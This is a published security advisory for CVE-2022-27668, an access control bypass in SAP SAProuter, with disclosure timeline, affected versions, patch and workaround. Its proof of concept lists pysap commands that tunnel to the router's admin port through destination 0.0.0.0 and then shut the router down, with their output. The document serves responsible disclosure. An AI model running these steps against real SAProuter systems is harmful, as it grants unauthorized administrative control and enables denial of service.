@@ -1,0 +1,280 @@
+
+Date: Wed, 14 Sep 2022 09:31:25 +0000
+From: "SEC Consult Vulnerability Lab,
+ Research via Fulldisclosure" <fulldisclosure@...lists.org>
+To: "fulldisclosure@...lists.org" <fulldisclosure@...lists.org>
+Subject: [FD] SEC Consult SA-20220914-0 :: Improper Access Control in SAP® SAProuter
+
+SEC Consult Vulnerability Lab Security Advisory < 20220914-0 >
+=======================================================================
+               title: Improper Access Control
+             product: SAP® SAProuter
+  vulnerable version: see section "Vulnerable / tested versions"
+       fixed version: see SAP security note 3158375
+          CVE number: CVE-2022-27668
+              impact: high
+            homepage: https://support.sap.com/en/tools/connectivity-tools/saprouter.html
+               found: 2022-02-25
+                  by: Fabian Hagg (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"SAProuter is a software application that provides a remote connection
+between our customer's network and SAP. SAProuter can be used to:
+
+- Improve network security, e.g.by using a password or by only allowing
+   encrypted connections from known sources
+- Control and log the connections to your SAP system
+- Set up an indirect connection when programs involved cannot
+   communicate with each other due to the network configuration
+- Increase performance and stability by reducing the SAP system workload
+   within a local area network (LAN) when communicating with a wide area
+   network (WAN)" [1]
+
+[1] https://support.sap.com/en/tools/connectivity-tools/saprouter.html
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends to implement the security note 3158375, where the
+documented issue is fixed according to the vendor. We advise installing the
+correction as a matter of priority to keep business-critical data secured.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Improper Access Control (CVE-2022-27668)
+According to SAP note 1853140: "in the default configuration, the
+SAProuter does not allow a route to itself. You can explicitly permit
+the 'loopback' from the SAProuter to itself using option -X".
+
+It has been identified that under certain circumstances, this is not
+valid and may lead to unexpected behavior. External attackers having
+network-wise access to a (weakly configured) SAProuter instance can
+exploit an improper access control vulnerability by sending packets
+of type NI_ROUTE in order to establish a tunnel that allows to manage
+the SAProuter externally even when it was started without option -X.
+
+This enables an attacker to send packets of type ROUTER_ADM in order to
+gain unauthorized access to administrative functions such as stopping
+the remote SAProuter instance, displaying connection information,
+switching trace level, or terminating a specific connection.
+
+
+Proof of concept:
+-----------------
+1) Improper Access Control (CVE-2022-27668)
+For successful exploitation of this vulnerability, the following prerequisites
+must be met:
+
+- Route permission table saprouttab must contain an entry that
+   explicitly permits external hosts to connect to port 3299 of
+   arbitrary hosts. Some examples of such entries are shown in
+   the following listing:
+
+   P  <source-host incl. attacker-controlled machine>  *  3299
+   P  <source-host incl. attacker-controlled machine>  *  3200.3300
+
+- SAProuter is running (option -X does not need to be set) and the
+   attacker has network-wise access to its listening port.
+
+The vulnerability can be verified by means of the publicly available
+Python script router_portfw.py [2] of the open source pysap framework
+developed by M. Gallo. The script, which is based on a scapy re-implementation
+of the proprietary SAP Router protocol, allows for port forwarding through
+a SAProuter service.
+
+For demonstration purposes, the following simplified lab setup is used:
+
+-------------------------------------------------------------------------
+SAProuter (IPv4:192.168.56.103) <-----> Attacker (IPv4:192.168.56.104)
+-------------------------------------------------------------------------
+SAProuter started with option -r:  |    Pysap framework
+./saprouter -r                     |
+                                    |
+Content of saprouttab in workdir:  |
+P  192.168.56.104  *  3299         |
+-------------------------------------------------------------------------
+
+The following listing shows that it is not possible to establish a
+"loopback" tunnel through the remote SAProuter service by specifying a
+target destination host 127.0.0.1 (option -t) and target destination
+port 3299 (option -r). As expected, this route is filtered and denied
+by default even when explicitly allowed through the route permission
+table.
+
+--------------------------------------------------------------------------
+attacker@....168.56.104$ python router_portfw.py -d 192.168.56.103 -p 3299
+-t 127.0.0.1 -r 3299 -a 127.0.0.1 -l 3299 -v
+[*] Setting a proxy between 127.0.0.1:3299 and remote SAP Router 192.168.
+56.103:3299 (talk mode raw)
+SAPNIProxy: Binded to address 127.0.0.1:3299, proxying to 192.168.56.103:
+3299
+Routing to 127.0.0.1:3299
+To send 61 bytes data + 4 bytes NI header
+Received 4 bytes NI header, to receive 211 bytes data
+Received 211 bytes data
+Route request to 127.0.0.1:3299 not accepted by 192.168.56.103:3299
+--------------------------------------------------------------------------
+
+It was discovered that it is possible to circumvent this check using
+the non-standard IPv4 broadcast address 0.0.0.0 (see RFC5735, RFC1122).
+When specifying destination host 0.0.0.0 and destination port 3299,
+this leads to an effective access control bypass as can be seen in the
+following listing.
+
+--------------------------------------------------------------------------
+attacker@....168.56.104$ python router_portfw.py -d 192.168.56.103 -p 3299
+-t 0.0.0.0 -r 3299 -a 127.0.0.1 -l 3299 -v
+[*] Setting a proxy between 127.0.0.1:3299 and remote SAP Router 192.168.
+56.103:3299 (talk mode raw)
+SAPNIProxy: Binded to address 127.0.0.1:3299, proxying to 192.168.56.103:
+3299
+Routing to 0.0.0.0:3299
+To send 59 bytes data + 4 bytes NI header
+Received 4 bytes NI header, to receive 8 bytes data
+Received 8 bytes data
+Route request to 0.0.0.0:3299 accepted by 192.168.56.103:3299
+
+attacker@....168.56.104$ ss -antlp | grep "3299"
+LISTEN 0    5  127.0.0.1:3299  0.0.0.0:*  users:(("python",pid=1985,fd=3))
+--------------------------------------------------------------------------
+
+Once the tunnel is established, an attacker can leverage administrative
+functions using its local port 3299 which is forwarded to the loopback
+interface of the remote SAProuter instance. For example, the Python
+script router_admin.py [3] of the pysap framework can be used to
+shutdown (option -s) the running SAProuter instance on the remote host.
+
+--------------------------------------------------------------------------
+attacker@....168.56.104$ python router_admin.py -s -d 127.0.0.1 -p 3299
+[*] Requesting stop of the remote SAP Router
+[*] Connected to the SAP Router 127.0.0.1:3299
+[*] Using SAP Router version 40
+[*] Sending Router Admin packet
+
+
+netwadm@....168.56.103$ ./saprouter -r
+
+trcfile dev_rout
+no logging active
+
+WARNING: wildcard character used in route target
+
+shutdown message received, good bye ...
+--------------------------------------------------------------------------
+
+External links:
+[2] https://github.com/SecureAuthCorp/pysap/blob/master/examples/router_portfw.py
+[3] https://github.com/SecureAuthCorp/pysap/blob/master/examples/router_admin.py
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following versions of the binary were found to be vulnerable during our tests:
+
+- SAProuter as part of kernel 753 patch no. 400 (Linux, 64 BIT UNICODE)
+- SAProuter as part of kernel 777 patch no. 200 (Linux, 64 BIT UNICODE)
+
+No additional testing on other releases has been carried out. According to the vendor
+the following releases and versions are affected by the discovered vulnerability:
+
+- KRNL64NUC     7.49			
+- KRNL64UC      7.49			
+- SAP_ROUTER    7.53			
+- SAP_ROUTER    7.22			
+- KERNEL        7.49			
+- KERNEL        7.77			
+- KERNEL        7.81			
+- KERNEL        7.85			
+- KERNEL        7.86			
+- KERNEL        7.87			
+- KERNEL        7.88
+
+
+Vendor contact timeline:
+------------------------
+2022-02-25: Contacting vendor through vulnerability submission web form.
+2022-03-05: Vendor confirms receipt and assigns internal ID #2270010706.
+2022-04-04: Requesting status update.
+2022-04-05: Vendor confirms vulnerability and states that a fix is already
+             complete. The corresponding security note is expected to be
+             released with the upcoming April 2022 patch day.
+2022-04-12: Patch day April 2022 passed without release.
+2022-05-10: Patch day May 2022 passed without release.
+2022-06-14: Vendor releases patch with SAP Security Note 3158375.
+2022-06-14: Requesting confirmation that the finding was fixed by the
+             published security note as no prior notification was provided.
+2022-06-28: Vendor confirms that the patch included in Security Note 3158375
+             fixes the issue. The vulnerability got assigned CVE-2022-27668.
+2022-09-14: Release of this security advisory.
+
+
+Solution:
+---------
+The vendor provides a patched version which should be installed immediately.
+The software can be obtained via the SAP service marketplace. Further
+information can be found in the corresponding Security Note 3158375 [4].
+
+[4] https://launchpad.support.sap.com/#/notes/3158375
+
+
+Workaround:
+-----------
+Remove any wildcard (*) values in the target host or IP address directive
+in route permission table saprouttab entries 'P' and 'S'. In general, it
+is recommended to not make use of any wildcard values in the route permission
+table saprouttab. Additional information on the secure configuration of
+SAProuter can be found in SAP Security Note/KBA 1895350 [5].
+
+[5] https://launchpad.support.sap.com/#/notes/1895350
+
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult, an Atos company
+Europe | Asia | North America
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an
+Atos company. It ensures the continued knowledge gain of SEC Consult in the
+field of network and application security to stay ahead of the attacker. The
+SEC Consult Vulnerability Lab supports high-quality penetration testing and
+the evaluation of new offensive and defensive technologies for our customers.
+Hence our customers obtain the most current information about vulnerabilities
+and valid recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://sec-consult.com/career/
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://sec-consult.com/contact/
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: security-research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
+
+EOF F. Hagg / @2022
+_______________________________________________
+Sent through the Full Disclosure mailing list
+https://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: https://seclists.org/fulldisclosure/
